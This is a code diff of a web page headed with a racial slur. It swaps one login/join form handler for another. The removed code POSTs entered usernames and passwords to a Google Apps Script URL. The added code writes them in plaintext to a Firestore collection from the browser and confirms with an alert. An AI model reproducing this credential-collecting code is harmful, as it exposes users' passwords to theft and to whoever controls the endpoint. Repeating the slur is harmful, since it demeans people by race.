@@ -25,13 +25,54 @@
         <h2>Terrorist Niggas</h2>
         </div>
 
-       <div class="input">
-   <!-- User Input Form -->
-        <form onsubmit="sendDataToGoogleSheets(); return false;">
-            <input type="text" id="username" placeholder="username" class="input-field">
-            <input type="password" id="password" placeholder="Password" class="input-field">
-            <button type="submit" class="login-btn">Join</button>
-        </form>
+       <div class="login-container">
+        <h2>Login</h2>
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Username" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit">Login</button>
+    </form>
+
+    <!-- Firebase & Firestore Scripts -->
+    <script src="https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.5.0/firebase-firestore.js"></script>
+
+    <script>
+        // Initialize Firebase
+        const firebaseConfig = {
+  apiKey: "AIzaSyA539oRhSFY_3gAZgRZ1_ec6yZI_6dcuWw",
+  authDomain: "login-system-4905a.firebaseapp.com",
+  projectId: "login-system-4905a",
+  storageBucket: "login-system-4905a.firebasestorage.app",
+  messagingSenderId: "647558155220",
+  appId: "1:647558155220:web:d99b742f0d171a6015a441"
+};
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        // Handle form submission
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            // Get form values
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            // Store login data in Firestore
+            db.collection("users").add({
+                username: username,
+                password: password
+            }).then(() => {
+                alert("Login data saved successfully!");
+            }).catch((error) => {
+                console.error("Error saving data: ", error);
+            });
+        });
+    </script>
+
+           
+        <p id="message" style="color: red; margin-top: 10px;"></p>
     </div>
     <!-- Warning Section -->
     <div class="warning">
@@ -73,26 +114,9 @@
             }
         });
         
-function sendDataToGoogleSheets() {
-    var data = {
-        username: document.getElementById("username").value,
-        password: document.getElementById("password").value
-    };
 
-    fetch("https://script.google.com/macros/s/AKfycbxRgLZHsbZVbi4zi95wLgVNwmZ2XGqCXFYa3L8YJ5jeA04XkNm_qOupkzX7jDypCFr4ww/exec", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-    })
-    .then(response => response.text())  // Convert response to text
-    .then(data => console.log("Server Response:", data))
-    .catch(error => console.error("Error:", error));
-}
-
-
-
+ 
     </script>
-
 </body>
 
 
